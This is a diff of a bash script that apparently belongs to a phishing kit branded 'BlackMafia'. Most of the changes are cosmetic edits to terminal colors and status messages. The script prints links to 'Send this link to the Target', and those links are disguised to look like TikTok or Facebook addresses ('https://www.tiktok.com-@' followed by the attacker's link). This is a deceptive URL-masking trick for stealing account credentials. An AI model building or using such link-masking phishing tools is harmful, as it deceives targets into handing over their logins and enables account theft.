@@ -2,14 +2,18 @@
 clear
 echo ""
 echo ""
-printf "\e[100;330m[\e[10m⛔]\e[1;40m\e[10m BlackMafia SERVER Conecting....:\e[1;32m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK!\e[0m"
+printf "\e[100;330m⛔\e[1;40m\e[10m BlackMafia SERVER Conecting....\e[0m"
+sleep 2
+printf "\e[100;330m⛔\e[1;40m\e[10m TURN ON MOBILE DATA & HOTSPOT!\e[0m"
 sleep 4
+printf "\e[100;330m⛔\e[1;40m\e[10m OTHERWISE IT WILL NOT WORK!\e[0m"
+sleep 3
 echo ""
 clear
 echo ""
 echo ""
 echo ""
-read -p $'\e[100;330m[\e[10m⛔]\e[1;40m\e[10mHow you use this information is your responsibility\e[1;91m (Y/N) : \e[0m' option
+read -p $'\e[100;330m⛔\e[1;40m\e[10m How you use this information is your responsibility\e[1;91m (Y/N) : \e[0m' option
 echo""
 echo""
 echo""
@@ -32,7 +36,7 @@ bash Logo.sh
 cat Logo.txt | lolcat
 echo ""
 echo "" 
-                 read -p $'\e[1;91m[\e[0m\e[1;91m ➡️\e[0m\e[1;96m]\e[0m\e[1;96m Choose Any Option \e[1;91m  > > \e[0m' option
+                 read -p $'\e[1;91m[\e[0m\e[1;91m ⛔\e[0m\e[1;96m]\e[0m\e[1;96m Choose Any Option\e[1;91m>>\e[0m' option
                  echo ""
 		 if [ $option = 01 ] || [ $option = 1 ]
                  then 
@@ -64,11 +68,11 @@ echo ""
                            if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                            then
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.tiktok.com-@$link                                    
+                           printf "\e[1;33m\e[0m\e[1;35m Send this link to the Target :\e[0m\e[1;72m %s\e[0m\n" https://www.tiktok.com-@$link                                    
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            else
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
+                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;72m %s\e[0m\n" https://$link
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            fi
                            
@@ -111,11 +115,11 @@ echo ""
                            if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                            then
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.facebook.com-@$link                                    
+                           printf "\e[1;33m\e[0m\e[1;35m Send this link to the Target :\e[0m\e[1;71m %s\e[0m\n" https://www.facebook.com-@$link                                    
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            else
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
+                           printf "\e[1;33m\e[0m\e[1;35m Send this link to the Target :\e[0m\e[1;72m %s\e[0m\n" https://$link
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            fi
                            
